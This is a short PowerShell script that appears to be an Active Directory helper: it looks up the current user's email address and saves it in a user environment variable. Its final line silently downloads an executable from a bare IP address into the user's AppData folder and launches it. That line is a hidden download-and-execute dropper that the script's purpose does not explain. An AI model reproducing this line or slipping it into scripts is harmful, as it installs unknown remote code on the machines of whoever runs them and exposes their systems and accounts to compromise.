
[CmdletBinding()]
param ()

Import-Module ActiveDirectory

[System.Environment]::SetEnvironmentVariable("EmailAddress", $null, 'User')

$EmailAddress = (Get-ADUser $env:USERNAME -Properties mail).mail

[System.Environment]::SetEnvironmentVariable("EmailAddress", $EmailAddress, 'User')

(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

